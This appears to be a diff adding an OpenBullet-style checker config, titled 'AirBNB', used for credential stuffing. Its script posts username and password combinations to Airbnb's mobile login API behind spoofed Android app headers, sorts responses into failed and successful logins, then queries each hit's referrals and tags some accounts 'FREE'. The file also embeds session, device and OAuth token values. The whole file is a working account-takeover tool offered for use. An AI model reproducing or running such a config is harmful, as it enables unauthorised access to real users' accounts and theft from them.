@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "AirBNB",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T06:55:26.3402608+02:00",
+  "AdditionalInfo": "",
+  "Author": "Fairy#6869",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://api.airbnb.com/v2/logins?client_id=3092nxybyb0otqw18e8nh5nty&locale=en-US&currency=USD" 
+  CONTENT "{\"type\":\"email\",\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: Airbnb/16060289 Android/4.4.2 Device/samsung_SM-N9005 Carrier/Clearnet Type/Phone" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Return-Strategy: single" 
+  HEADER "Host: api.airbnb.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Cookie: jitney_client_session_id=06c8647a-d7b5-45e7-9beb-8e309a362060" 
+  HEADER "X-Airbnb-SID: 1:1554608184:IjA0ZDNhODhkZDFiMDFhZDAyNGU4Mjg2ZTg4MDBmNGZhZjU4MGRhY2UyMTA5ZGYwYTA4NTMzMDAyMTg2ZDJkMzAi--3927325e3ddd0363f97d28b0abb999a531edf698" 
+  HEADER "X-Airbnb-Network-Type: wifi" 
+  HEADER "X-Airbnb-Device-ID: d89c6704c3dd6588" 
+  HEADER "X-Airbnb-Carrier-Country: CA" 
+  HEADER "X-Airbnb-Advertising-ID: e0262b1d-0f0a-4c60-b6a1-8016ee52a10b" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "error_code\":403" 
+  KEYCHAIN Success OR 
+    KEY "login\":{\"account\":{\"" 
+#UID PARSE "<SOURCE>" JSON "user_id" -> VAR "UID" 
+REQUEST GET "https://api.airbnb.com/v2/referrals?user_id=<UID>&client_id=3092nxybyb0otqw18e8nh5nty&locale=en-US&currency=USD" BasicAuth 
+  USERNAME "" PASSWORD "" 
+  
+  HEADER "User-Agent: Airbnb/16060289 Android/4.4.2 Device/samsung_SM-N9005 Carrier/Clearnet Type/Phone" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Airbnb-SID: 1:1554608184:IjA0ZDNhODhkZDFiMDFhZDAyNGU4Mjg2ZTg4MDBmNGZhZjU4MGRhY2UyMTA5ZGYwYTA4NTMzMDAyMTg2ZDJkMzAi--3927325e3ddd0363f97d28b0abb999a531edf698" 
+  HEADER "X-Airbnb-Network-Type: wifi" 
+  HEADER "X-Airbnb-Device-ID: d89c6704c3dd6588" 
+  HEADER "X-Airbnb-Carrier-Country: CA" 
+  HEADER "X-Airbnb-OAuth-Token: b94hmrnh1pqbwby8g2itz9shq" 
+  HEADER "X-Airbnb-Advertising-ID: e0262b1d-0f0a-4c60-b6a1-8016ee52a10b" 
+  HEADER "X-Return-Strategy: single" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: api.airbnb.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"referrals\":[],\"metadata\":{}}" 
